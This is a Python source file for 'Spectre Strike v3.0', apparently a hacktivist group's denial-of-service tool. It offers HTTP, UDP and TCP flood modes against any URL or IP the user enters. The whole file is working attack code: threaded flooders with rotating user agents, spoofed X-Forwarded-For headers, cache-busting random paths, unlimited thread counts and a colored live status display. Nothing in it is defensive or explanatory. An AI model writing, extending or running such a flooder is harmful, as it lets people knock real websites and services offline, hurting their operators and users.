# -*- coding: utf-8 -*-
"""
Spectre Strike v3.0
Author : Ochena Gamer
Team   : Bangladesh Cyber Spectre
"""

import os, sys, time, random, socket, threading, shutil
from platform import system
from collections import deque

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    os.system(f"{sys.executable} -m pip install requests -q")
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry

import urllib3
urllib3.disable_warnings()

# ─── ANSI ─────────────────────────────────────────────────────────────────────
C  = "\033[96m"   # cyan
G  = "\033[92m"   # green
Y  = "\033[93m"   # yellow
R  = "\033[91m"   # red
W  = "\033[97m"   # white
DM = "\033[90m"   # dark
RS = "\033[0m"    # reset
BOLD = "\033[1m"

def clr(): os.system("cls" if system()=="Windows" else "clear")

# ─── Live Display Engine ──────────────────────────────────────────────────────

TERM_W   = shutil.get_terminal_size((80, 24)).columns
LOG_ROWS = 12          # scrolling lines above stats bar
log_buf  = deque(maxlen=LOG_ROWS)
log_lock = threading.Lock()

# stat counters
sent   = 0
errors = 0
rate   = 0          # packets/sec last second
s_lock = threading.Lock()

stop_evt    = threading.Event()
display_evt = threading.Event()

LOG_COLORS = [G, C, Y, W, "\033[95m", "\033[94m"]

def add_log(msg):
    with log_lock:
        color = random.choice(LOG_COLORS)
        ts = time.strftime("%H:%M:%S")
        log_buf.append(f"{DM}[{ts}]{RS} {color}{msg}{RS}")

def _bar(pct, width=20):
    filled = int(width * pct)
    return G + "█" * filled + DM + "░" * (width - filled) + RS

def render_display(target_label, mode_label, thread_count, power):
    """Redraws the entire live panel."""
    global sent, errors, rate

    # move cursor to top-left, don't clear (flicker-free)
    sys.stdout.write("\033[H")

    # ── header ──────────────────────────────────────────────────────────────
    hdr = f" Spectre Strike v3.0  |  {mode_label}  |  BCS "
    pad = max(0, TERM_W - len(hdr) - 2)
    sys.stdout.write(f"{C}{'─'*TERM_W}{RS}\n")
    sys.stdout.write(f"{C}│{BOLD}{Y}{hdr}{RS}{C}{'':>{pad}}│{RS}\n")
    sys.stdout.write(f"{C}{'─'*TERM_W}{RS}\n")

    # ── scrolling log ────────────────────────────────────────────────────────
    with log_lock:
        lines = list(log_buf)

    # pad to LOG_ROWS so panel height stays fixed
    while len(lines) < LOG_ROWS:
        lines.insert(0, "")

    for line in lines:
        # truncate to terminal width (strip ANSI for length calc is complex,
        # so just limit raw chars)
        display = line[:TERM_W - 2] if line else ""
        sys.stdout.write(f" {display:<{TERM_W-2}}\n")

    sys.stdout.write(f"{DM}{'─'*TERM_W}{RS}\n")

    # ── stats bar ────────────────────────────────────────────────────────────
    with s_lock:
        s, e, r = sent, errors, rate

    pwr_pct = power / 10
    pwr_bar = _bar(pwr_pct, 15)

    sys.stdout.write(
        f" {W}TARGET  {RS}{Y}{target_label:<30}{RS}"
        f"  {W}THREADS {RS}{G}{thread_count}{RS}\n"
    )
    sys.stdout.write(
        f" {W}SENT    {RS}{G}{BOLD}{s:<12}{RS}"
        f"  {W}ERRORS  {RS}{R}{e:<10}{RS}"
        f"  {W}RATE    {RS}{C}{r}/s{RS}\n"
    )
    sys.stdout.write(
        f" {W}POWER   {RS}{pwr_bar} {Y}{power}/10{RS}\n"
    )
    sys.stdout.write(f"{DM}{'─'*TERM_W}{RS}\n")
    sys.stdout.write(f" {DM}Press Ctrl+C to stop{RS}\n")
    sys.stdout.flush()

def display_loop(target_label, mode_label, thread_count, power):
    # reserve terminal space
    clr()
    total_rows = 3 + LOG_ROWS + 1 + 5 + 1   # header+log+divider+stats+footer
    sys.stdout.write("\n" * total_rows)
    sys.stdout.write(f"\033[{total_rows}A")   # move back up

    prev_sent = 0
    while not stop_evt.is_set():
        with s_lock:
            cur = sent
        # compute rate
        r = cur - prev_sent
        prev_sent = cur
        with s_lock:
            globals()['rate'] = r

        render_display(target_label, mode_label, thread_count, power)
        time.sleep(1)

    # final render
    with s_lock:
        globals()['rate'] = 0
    render_display(target_label, mode_label, thread_count, power)

# ─── User Agents ──────────────────────────────────────────────────────────────

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0.0.0 Mobile",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "curl/8.5.0",
    "python-requests/2.31.0",
]

PATHS = ["", "/?cache=" , "/index.php?r=", "/search?q=",
         "/api/v1/", "/?id=", "/wp-login.php", "/admin/"]

DELAYS = {1:0.5, 2:0.3, 3:0.15, 4:0.08, 5:0.04,
          6:0.02, 7:0.008, 8:0.003, 9:0.001, 10:0}

# ─── Workers ──────────────────────────────────────────────────────────────────

def http_worker(url, power):
    global sent, errors
    session = requests.Session()
    adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1,
                          max_retries=Retry(total=0))
    session.mount("http://",  adapter)
    session.mount("https://", adapter)
    delay = DELAYS.get(power, 0.01)

    while not stop_evt.is_set():
        try:
            path   = random.choice(PATHS) + str(random.randint(1000, 99999))
            target = url + path
            hdrs = {
                "User-Agent":      random.choice(UAS),
                "Accept":          "text/html,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Connection":      "keep-alive",
                "Cache-Control":   "no-cache",
                "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(0,255)}"
                                   f".{random.randint(0,255)}.{random.randint(1,254)}",
            }
            r = session.get(target, headers=hdrs, timeout=4, verify=False)
            with s_lock:
                sent += 1
            add_log(f"GET {target[:55]}  [{r.status_code}]")
        except Exception as ex:
            with s_lock:
                errors += 1
            add_log(f"{R}ERR{RS} {str(ex)[:60]}")
        if delay:
            time.sleep(delay)

def udp_worker(ip, port, power):
    global sent, errors
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
    delay = DELAYS.get(power, 0.001)

    while not stop_evt.is_set():
        try:
            size = random.randint(512, 1400)
            data = random._urandom(size)
            p    = random.randint(1, 65535) if port == 0 else port
            sock.sendto(data, (ip, p))
            with s_lock:
                sent += 1
            add_log(f"UDP → {ip}:{p}  size={size}B")
        except Exception as ex:
            with s_lock:
                errors += 1
            add_log(f"{R}ERR{RS} {str(ex)[:60]}")
        if delay:
            time.sleep(delay)

def tcp_worker(ip, port, power):
    global sent, errors
    delay = DELAYS.get(power, 0.005)

    while not stop_evt.is_set():
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((ip, port))
            s.send(random._urandom(random.randint(64, 512)))
            s.close()
            with s_lock:
                sent += 1
            add_log(f"TCP connect → {ip}:{port}  OK")
        except Exception as ex:
            with s_lock:
                errors += 1
            add_log(f"{R}TCP fail{RS} {str(ex)[:55]}")
            try:
                if s: s.close()
            except: pass
        if delay:
            time.sleep(delay)

# ─── Launch ───────────────────────────────────────────────────────────────────

def launch(worker_fn, worker_args, threads, target_label, mode_label, power):
    global sent, errors, rate
    stop_evt.clear()
    sent = errors = rate = 0
    log_buf.clear()

    for _ in range(threads):
        t = threading.Thread(target=worker_fn, args=worker_args, daemon=True)
        t.start()

    dt = threading.Thread(
        target=display_loop,
        args=(target_label, mode_label, threads, power),
        daemon=True,
    )
    dt.start()

    try:
        while True:
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_evt.set()
        time.sleep(1.2)
        with s_lock:
            s, e = sent, errors
        print(f"\n{R}[!] Stopped  |  Total Sent: {s}  |  Errors: {e}{RS}\n")
        time.sleep(0.5)

# ─── Input helpers ────────────────────────────────────────────────────────────

def gi(prompt_text, default, lo=0, hi=999999):
    """Get int with unlimited upper bound option."""
    val = input(prompt_text).strip()
    if not val:
        return default
    if val.isdigit():
        v = int(val)
        return max(lo, min(hi, v))
    return default

# ─── Banner + Menu ────────────────────────────────────────────────────────────

BANNER = f"""
{C}   ██████╗  ██████╗   ███████╗  ██████╗ ████████╗ ██████╗   ███████╗
  ██╔════╝  ██╔══██╗  ██╔════╝ ██╔════╝ ╚══██╔══╝ ██╔══██╗  ██╔════╝
  ╚█████╗   ██████╔╝  █████╗   ██║         ██║    ██████╔╝  █████╗
   ╚════██╗ ██╔═══╝   ██╔══╝   ██║         ██║    ██╔══██╗  ██╔══╝
  ██████╔╝  ██║       ███████╗ ╚██████╗    ██║    ██║  ██║  ███████╗
  ╚═════╝   ╚═╝       ╚══════╝  ╚═════╝    ╚═╝    ╚═╝  ╚═╝  ╚══════╝{RS}
{Y}            Strike v3.0  |  Ochena Gamer  |  BCS{RS}
{DM}  ──────────────────────────────────────────────────────{RS}
"""

MENU = f"""
{G}  [1]  HTTP Flood   (Website / Layer 7)
  [2]  UDP Flood    (Layer 4 — raw packets)
  [3]  TCP Flood    (Layer 4 — connection flood)
  [4]  Exit{RS}
"""

while True:
    clr()
    print(BANNER)
    print(MENU)
    choice = input("  > ").strip()

    # ── HTTP ────────────────────────────────────────────────────────────────
    if choice == "1":
        url = input("\n  Website URL: ").strip()
        if not url.startswith("http"):
            url = "http://" + url
        power   = gi(f"  Power   (1-10)  [7] : ", 7, 1, 10)
        threads = gi(f"  Threads (unlimited) [30]: ", 30, 1, 999999)
        print(f"\n{C}  [*] Target  : {url}")
        print(f"  [*] Power   : {power}/10")
        print(f"  [*] Threads : {threads}{RS}\n")
        time.sleep(0.8)
        launch(http_worker, (url, power), threads, url, "HTTP FLOOD", power)

    # ── UDP ─────────────────────────────────────────────────────────────────
    elif choice == "2":
        target = input("\n  IP or Domain: ").strip()
        try:    ip = socket.gethostbyname(target)
        except: ip = target
        port    = gi("  Port (0=random): ", 0, 0, 65535)
        power   = gi("  Power   (1-10)  [7] : ", 7, 1, 10)
        threads = gi("  Threads (unlimited) [40]: ", 40, 1, 999999)
        print(f"\n{C}  [*] Target  : {ip}")
        print(f"  [*] Port    : {'Random' if port==0 else port}")
        print(f"  [*] Power   : {power}/10")
        print(f"  [*] Threads : {threads}{RS}\n")
        time.sleep(0.8)
        launch(udp_worker, (ip, port, power), threads, ip, "UDP FLOOD", power)

    # ── TCP ─────────────────────────────────────────────────────────────────
    elif choice == "3":
        target = input("\n  IP or Domain: ").strip()
        try:    ip = socket.gethostbyname(target)
        except: ip = target
        port    = gi("  Port [80]: ", 80, 1, 65535)
        power   = gi("  Power   (1-10)  [7] : ", 7, 1, 10)
        threads = gi("  Threads (unlimited) [50]: ", 50, 1, 999999)
        print(f"\n{C}  [*] Target  : {ip}")
        print(f"  [*] Port    : {port}")
        print(f"  [*] Power   : {power}/10")
        print(f"  [*] Threads : {threads}{RS}\n")
        time.sleep(0.8)
        launch(tcp_worker, (ip, port, power), threads, ip, "TCP FLOOD", power)

    elif choice == "4":
        print(f"\n{Y}  Exiting...{RS}\n")
        break

    else:
        print(f"{R}  Invalid option.{RS}")
        time.sleep(0.8)
